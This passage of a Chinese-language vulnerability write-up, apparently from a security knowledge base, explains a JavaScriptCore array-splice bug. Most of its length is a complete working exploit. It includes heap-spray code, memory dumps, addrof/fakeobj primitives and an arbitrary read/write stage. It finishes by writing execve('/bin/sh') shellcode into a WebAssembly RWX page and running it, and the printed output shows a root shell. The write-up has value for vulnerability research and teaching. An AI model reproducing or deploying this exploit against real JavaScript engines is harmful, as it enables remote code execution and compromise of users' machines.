<div class="codehilite"><pre><span></span><code><span class="n">arr</span><span class="p">.</span><span class="n">splice</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>

<span class="n">fake_index</span><span class="o">=-</span><span class="mi">1</span><span class="p">;</span><span class="w">                               </span>
<span class="k">for</span><span class="p">(</span><span class="n">let</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x3000</span><span class="p">;</span><span class="n">i</span><span class="o">+=</span><span class="mi">2</span><span class="p">)</span><span class="err">{</span><span class="w">                  </span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">spray</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="n">length</span><span class="o">!=</span><span class="mi">10</span><span class="p">)</span><span class="err">{</span><span class="w">                 </span>
<span class="w">       </span><span class="k">print</span><span class="p">(</span><span class="ss">&quot;hit: &quot;</span><span class="o">+</span><span class="n">i</span><span class="p">.</span><span class="n">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span><span class="w">       </span>
<span class="w">       </span><span class="n">fake_index</span><span class="o">=</span><span class="n">i</span><span class="p">;</span><span class="w">                        </span>
<span class="w">       </span><span class="k">break</span><span class="p">;</span><span class="w">                               </span>
<span class="w">    </span><span class="err">}</span><span class="w">                                        </span>
<span class="err">}</span><span class="w">   </span>
<span class="o">//</span><span class="p">..</span><span class="n">spray</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="n">ArrayWithDouble</span>
<span class="mh">0x7ff000287ff8</span><span class="err">:</span><span class="w"> </span><span class="mh">0x00000000badbeef0</span><span class="w">      </span><span class="mh">0x0000000d0000000a</span>
<span class="mh">0x7ff000288008</span><span class="err">:</span><span class="w"> </span><span class="mh">0x0000000000001337</span><span class="w">      </span><span class="mh">0x402abd70a3d70a3d</span>
<span class="mh">0x7ff000288018</span><span class="err">:</span><span class="w"> </span><span class="mh">0x402abd70a3d70a3d</span><span class="w">      </span><span class="mh">0x402abd70a3d70a3d</span>
<span class="mh">0x7ff000288028</span><span class="err">:</span><span class="w"> </span><span class="mh">0x402abd70a3d70a3d</span><span class="w">      </span><span class="mh">0x402abd70a3d70a3d</span>
<span class="mh">0x7ff000288038</span><span class="err">:</span><span class="w"> </span><span class="mh">0x402abd70a3d70a3d</span><span class="w">      </span><span class="mh">0x402abd70a3d70a3d</span>
<span class="mh">0x7ff000288048</span><span class="err">:</span><span class="w"> </span><span class="mh">0x402abd70a3d70a3d</span><span class="w">      </span><span class="mh">0x40c77caf5c28f5c3</span>
<span class="o">//</span><span class="w"> </span><span class="n">spray</span><span class="o">[</span><span class="n">i+1</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">ArrayWithContiguous</span>
<span class="mh">0x7ff000288058</span><span class="err">:</span><span class="w"> </span><span class="mh">0x7ff8000000000000</span><span class="w">      </span><span class="mh">0x7ff8000000000000</span>
<span class="mh">0x7ff000288068</span><span class="err">:</span><span class="w"> </span><span class="mh">0x7ff8000000000000</span><span class="w">      </span><span class="mh">0x0000000d0000000a</span>
<span class="mh">0x7ff000288078</span><span class="err">:</span><span class="w"> </span><span class="mh">0x00007fffae25d240</span><span class="w">      </span><span class="mh">0x00007fffae25d280</span>
<span class="mh">0x7ff000288088</span><span class="err">:</span><span class="w"> </span><span class="mh">0x00007fffae25d2c0</span><span class="w">      </span><span class="mh">0x00007fffae25d300</span>
<span class="mh">0x7ff000288098</span><span class="err">:</span><span class="w"> </span><span class="mh">0x00007fffae25d340</span><span class="w">      </span><span class="mh">0x00007fffae25d380</span>
<span class="mh">0x7ff0002880a8</span><span class="err">:</span><span class="w"> </span><span class="mh">0x00007fffae25d3c0</span><span class="w">      </span><span class="mh">0x00007fffae25d400</span>
<span class="mh">0x7ff0002880b8</span><span class="err">:</span><span class="w"> </span><span class="mh">0x00007fffae25d440</span><span class="w">      </span><span class="mh">0x00007fffae25d480</span>
</code></pre></div>

<p>到了这里, <code>spray[i][14] == spray[i+1][0]</code>, 往<code>spray[i][14]</code> 写一个
地址， 然后从<code>spray[i+1]</code> 取出来就会认为他是一个object,
同样可以用<code>spray[i][14]</code> 读 object 的地址， fakeobj 和 addrof
的构造就十分直接啦</p>
<div class="codehilite"><pre><span></span><code><span class="n">unboxed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">spray</span><span class="o">[</span><span class="n">fake_index</span><span class="o">]</span><span class="p">;</span><span class="w">   </span>
<span class="n">boxed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">spray</span><span class="o">[</span><span class="n">fake_index+1</span><span class="o">]</span><span class="p">;</span><span class="w">   </span>
<span class="k">print</span><span class="p">(</span><span class="k">describe</span><span class="p">(</span><span class="n">unboxed</span><span class="p">))</span><span class="w">       </span>
<span class="k">print</span><span class="p">(</span><span class="k">describe</span><span class="p">(</span><span class="n">boxed</span><span class="p">))</span>

<span class="k">function</span><span class="w"> </span><span class="n">addrof</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span><span class="err">{</span><span class="w">                 </span>
<span class="w">    </span><span class="n">boxed</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span><span class="w">                   </span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">f2i</span><span class="p">(</span><span class="n">unboxed</span><span class="o">[</span><span class="n">14</span><span class="o">]</span><span class="p">);</span>

<span class="err">}</span>

<span class="k">function</span><span class="w"> </span><span class="n">fakeobj</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="err">{</span><span class="w">               </span>
<span class="w">    </span><span class="n">unboxed</span><span class="o">[</span><span class="n">14</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i2f</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span><span class="w">          </span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">boxed</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">;</span><span class="w">                  </span>
<span class="err">}</span>
</code></pre></div>

<h4 id="wasm-getshell">任意地址读写 &amp; 写 wasm getshell<a class="headerlink" href="#wasm-getshell" title="Permanent link">&para;</a></h4>
<p>接下来的利用基本上就都是通用套路了，改 <code>ArrayWithDouble</code> 的 butterfly
任意地址读写，然后找 wasm 的<code>rwx</code> 段写shellcode, 执行shellcode 完事。</p>
<h3 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h3>
<p>完整exp 如下</p>
<div class="codehilite"><pre><span></span><code><span class="nf">var</span><span class="w"> </span><span class="n">conversion_buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="nf">var</span><span class="w"> </span><span class="n">f64</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Float64Array</span><span class="p">(</span><span class="n">conversion_buffer</span><span class="p">)</span>
<span class="nf">var</span><span class="w"> </span><span class="n">i32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Uint32Array</span><span class="p">(</span><span class="n">conversion_buffer</span><span class="p">)</span>

<span class="nf">var</span><span class="w"> </span><span class="n">BASE32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x100000000</span>
<span class="k">function</span><span class="w"> </span><span class="n">f2i</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">    </span><span class="n">f64</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">i32</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">BASE32</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">i32</span><span class="o">[</span><span class="n">1</span><span class="o">]</span>
<span class="err">}</span>

<span class="k">function</span><span class="w"> </span><span class="n">i2f</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">    </span><span class="n">i32</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">BASE32</span>
<span class="w">    </span><span class="n">i32</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">BASE32</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">f64</span><span class="o">[</span><span class="n">0</span><span class="o">]</span>
<span class="err">}</span>

<span class="k">function</span><span class="w"> </span><span class="n">user_gc</span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">let</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">10</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="n">let</span><span class="w"> </span><span class="n">ab</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayBuffer</span><span class="p">(</span><span class="mi">1024</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1024</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span>
<span class="w">    </span><span class="err">}</span>
<span class="err">}</span>

<span class="n">let</span><span class="w"> </span><span class="n">arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="p">;</span>

<span class="n">arr</span><span class="p">.</span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x100000</span><span class="p">;</span>
<span class="n">arr</span><span class="p">.</span><span class="n">splice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">);</span>
<span class="n">arr</span><span class="p">.</span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xfffffff0</span><span class="p">;</span>

<span class="n">let</span><span class="w"> </span><span class="n">spray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="k">Array</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">);</span>

<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">let</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x3000</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">    </span><span class="n">spray</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37+i</span><span class="o">]</span><span class="p">;</span>
<span class="w">    </span><span class="n">spray</span><span class="o">[</span><span class="n">i+1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">{},{},{},{},{},{},{},{},{},{}</span><span class="o">]</span><span class="p">;</span>
<span class="err">}</span>
<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">let</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x3000</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span>
<span class="w">    </span><span class="n">spray</span><span class="o">[</span><span class="n">i</span><span class="o">][</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i2f</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">)</span>


<span class="n">arr</span><span class="p">.</span><span class="n">splice</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>

<span class="n">fake_index</span><span class="o">=-</span><span class="mi">1</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="n">let</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x3000</span><span class="p">;</span><span class="n">i</span><span class="o">+=</span><span class="mi">2</span><span class="p">)</span><span class="err">{</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">spray</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="n">length</span><span class="o">!=</span><span class="mi">10</span><span class="p">)</span><span class="err">{</span>
<span class="w">        </span><span class="k">print</span><span class="p">(</span><span class="ss">&quot;hit: &quot;</span><span class="o">+</span><span class="n">i</span><span class="p">.</span><span class="n">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
<span class="w">        </span><span class="n">fake_index</span><span class="o">=</span><span class="n">i</span><span class="p">;</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="err">}</span>
<span class="err">}</span>

<span class="n">unboxed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">spray</span><span class="o">[</span><span class="n">fake_index</span><span class="o">]</span><span class="p">;</span>
<span class="n">boxed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">spray</span><span class="o">[</span><span class="n">fake_index+1</span><span class="o">]</span><span class="p">;</span>
<span class="k">print</span><span class="p">(</span><span class="k">describe</span><span class="p">(</span><span class="n">unboxed</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="k">describe</span><span class="p">(</span><span class="n">boxed</span><span class="p">))</span>


<span class="k">function</span><span class="w"> </span><span class="n">addrof</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span><span class="err">{</span>
<span class="w">    </span><span class="n">boxed</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">f2i</span><span class="p">(</span><span class="n">unboxed</span><span class="o">[</span><span class="n">14</span><span class="o">]</span><span class="p">);</span>

<span class="err">}</span>

<span class="k">function</span><span class="w"> </span><span class="n">fakeobj</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="err">{</span>
<span class="w">    </span><span class="n">unboxed</span><span class="o">[</span><span class="n">14</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i2f</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">boxed</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">;</span>
<span class="err">}</span>



<span class="n">victim</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">1.1</span><span class="o">]</span><span class="p">;</span>
<span class="n">victim</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="mf">3.3</span><span class="p">;;</span>
<span class="n">victim</span><span class="o">[</span><span class="n">&#39;prop&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">13.37</span><span class="p">;</span>
<span class="n">victim</span><span class="o">[</span><span class="n">&#39;prop&#39;+1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">13.37</span><span class="p">;</span>
<span class="k">print</span><span class="p">(</span><span class="k">describe</span><span class="p">(</span><span class="n">victim</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">addrof</span><span class="p">(</span><span class="n">victim</span><span class="p">).</span><span class="n">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>

<span class="n">i32</span><span class="o">[</span><span class="n">0</span><span class="o">]=</span><span class="mi">100</span><span class="p">;</span>
<span class="n">i32</span><span class="o">[</span><span class="n">1</span><span class="o">]=</span><span class="mh">0x01082107</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">;</span>
<span class="nf">var</span><span class="w"> </span><span class="n">container</span><span class="o">=</span><span class="err">{</span>
<span class="w">    </span><span class="nl">jscell</span><span class="p">:</span><span class="n">f64</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">,</span>
<span class="w">    </span><span class="nl">butterfly</span><span class="p">:</span><span class="n">victim</span><span class="p">,</span>
<span class="err">}</span>
<span class="k">print</span><span class="p">(</span><span class="k">describe</span><span class="p">(</span><span class="n">container</span><span class="p">))</span>
<span class="n">container_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">addrof</span><span class="p">(</span><span class="n">container</span><span class="p">);</span>
<span class="n">hax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fakeobj</span><span class="p">(</span><span class="n">container_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">);</span>

<span class="nf">var</span><span class="w"> </span><span class="n">unboxed2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">1.1</span><span class="o">]</span><span class="p">;</span>
<span class="n">unboxed2</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="mf">3.3</span><span class="p">;</span>

<span class="nf">var</span><span class="w"> </span><span class="n">boxed2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">{}</span><span class="o">]</span>

<span class="n">hax</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i2f</span><span class="p">(</span><span class="n">addrof</span><span class="p">(</span><span class="n">unboxed2</span><span class="p">))</span>
<span class="nf">var</span><span class="w"> </span><span class="n">shared</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">victim</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="p">;</span>
<span class="n">hax</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i2f</span><span class="p">(</span><span class="n">addrof</span><span class="p">(</span><span class="n">boxed2</span><span class="p">))</span>
<span class="n">victim</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shared</span><span class="p">;</span>

<span class="nf">var</span><span class="w"> </span><span class="n">stage2</span><span class="o">=</span><span class="err">{</span>
<span class="w">    </span><span class="nl">addrof</span><span class="p">:</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span><span class="err">{</span>
<span class="w">        </span><span class="n">boxed2</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">f2i</span><span class="p">(</span><span class="n">unboxed2</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">);</span>
<span class="w">    </span><span class="err">}</span><span class="p">,</span>
<span class="w">    </span><span class="nl">fakeobj</span><span class="p">:</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="err">{</span>
<span class="w">        </span><span class="n">unboxed2</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i2f</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">boxed2</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">;</span>
<span class="w">    </span><span class="err">}</span><span class="p">,</span>
<span class="w">    </span><span class="nl">read64</span><span class="p">:</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="err">{</span>
<span class="w">        </span><span class="n">hax</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i2f</span><span class="p">(</span><span class="n">addr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x10</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">this</span><span class="p">.</span><span class="n">addrof</span><span class="p">(</span><span class="n">victim</span><span class="p">.</span><span class="n">prop</span><span class="p">);</span>
<span class="w">    </span><span class="err">}</span><span class="p">,</span>
<span class="w">    </span><span class="nl">write64</span><span class="p">:</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="k">data</span><span class="p">)</span><span class="err">{</span>
<span class="w">        </span><span class="n">hax</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i2f</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">);</span>
<span class="w">        </span><span class="n">victim</span><span class="p">.</span><span class="n">prop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="p">.</span><span class="n">fakeobj</span><span class="p">(</span><span class="k">data</span><span class="p">)</span>
<span class="w">    </span><span class="err">}</span><span class="p">,</span>
<span class="w">    </span><span class="k">write</span><span class="err">:</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">shellcode</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="nf">var</span><span class="w"> </span><span class="n">theAddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">addr</span><span class="p">;</span>
<span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="nf">var</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">shellcode</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="err">{</span>
<span class="w">            </span><span class="n">this</span><span class="p">.</span><span class="n">write64</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="n">shellcode</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="n">charCodeAt</span><span class="p">())</span>
<span class="w">        </span><span class="err">}</span>
<span class="w">    </span><span class="err">}</span><span class="p">,</span>
<span class="w">    </span><span class="nl">pwn</span><span class="p">:</span><span class="w"> </span><span class="k">function</span><span class="p">()</span><span class="err">{</span>
<span class="w">        </span><span class="nf">var</span><span class="w"> </span><span class="n">wasm_code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Uint8Array</span><span class="p">(</span><span class="o">[</span><span class="n">0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11</span><span class="o">]</span><span class="p">);</span>
<span class="w">        </span><span class="nf">var</span><span class="w"> </span><span class="n">wasm_mod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">WebAssembly</span><span class="p">.</span><span class="k">Module</span><span class="p">(</span><span class="n">wasm_code</span><span class="p">);</span>
<span class="w">        </span><span class="nf">var</span><span class="w"> </span><span class="n">wasm_instance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">WebAssembly</span><span class="p">.</span><span class="n">Instance</span><span class="p">(</span><span class="n">wasm_mod</span><span class="p">);</span>
<span class="w">        </span><span class="nf">var</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">wasm_instance</span><span class="p">.</span><span class="n">exports</span><span class="p">.</span><span class="n">main</span><span class="p">;</span>
<span class="w">        </span><span class="nf">var</span><span class="w"> </span><span class="n">addr_f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="p">.</span><span class="n">addrof</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
<span class="w">        </span><span class="nf">var</span><span class="w"> </span><span class="n">addr_p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="p">.</span><span class="n">read64</span><span class="p">(</span><span class="n">addr_f</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x40</span><span class="p">);</span>
<span class="w">        </span><span class="nf">var</span><span class="w"> </span><span class="n">addr_shellcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="p">.</span><span class="n">read64</span><span class="p">(</span><span class="n">addr_p</span><span class="p">);</span>
<span class="w">        </span><span class="k">print</span><span class="p">(</span><span class="n">addr_f</span><span class="p">.</span><span class="n">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>
<span class="w">        </span><span class="k">print</span><span class="p">(</span><span class="n">addr_p</span><span class="p">.</span><span class="n">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>
<span class="w">        </span><span class="k">print</span><span class="p">(</span><span class="n">addr_shellcode</span><span class="p">.</span><span class="n">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
<span class="w">        </span><span class="n">shellcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;j;X\x99RH\xbb//bin/shST_RWT^\x0f\x05&quot;</span>
<span class="w">        </span><span class="n">this</span><span class="p">.</span><span class="k">write</span><span class="p">(</span><span class="n">addr_shellcode</span><span class="p">,</span><span class="w"> </span><span class="n">shellcode</span><span class="p">);</span>
<span class="w">        </span><span class="n">f</span><span class="p">();</span>
<span class="w">    </span><span class="err">}</span>
<span class="err">}</span>

<span class="n">stage2</span><span class="p">.</span><span class="n">pwn</span><span class="p">()</span>
</code></pre></div>

<h4 id="_8">运行效果<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h4>
<p>运行效果如下</p>
<div class="codehilite"><pre><span></span><code>╰$ ./jsc exp.js
hit: 2e5e
Object: 0x7fffae2af690 with butterfly 0x7fe00028c078 (Structure 0x7fffaf6f2a70:[Array, {}, ArrayWithDouble, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 98
Object: 0x7fffae2af6a0 with butterfly 0x7fe00028c0e8 (Structure 0x7fffaf6f2ae0:[Array, {}, ArrayWithContiguous, Proto:0x7fffaf6c80a0]), StructureID: 99
Object: 0x7fffae2591f0 with butterfly 0x7fe000280058 (Structure 0x7fffaf670d20:[Array, {prop:100, prop1:101}, ArrayWithDouble, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 317
7fffae2591f0
Object: 0x7fffaf6c8380 with butterfly (nil) (Structure 0x7fffaf670e00:[Object, {jscell:0, butterfly:1}, NonArray, Proto:0x7fffaf6b4000, Leaf]), StructureID: 319
7fffae208000
7ffff000a500
7fffb0001000
# id
uid=0(root) gid=0(root) groups=0(root)
#
</code></pre></div>

<p>##参考链接</p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/7694">https://xz.aliyun.com/t/7694</a>#toc-2</p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Weblogic/WebLogic%20Local%20File%20Inclusion%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2022-21371/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Weblogic/WebLogic%20Local%20File%20Inclusion%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2022-21371/" class="btn btn-xs btn-link">
        WebLogic Local File Inclusion 本地文件包含漏洞 CVE-2022-21371
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Webgrind/Webgrind%20fileviewer.phtml%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2018-12909/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
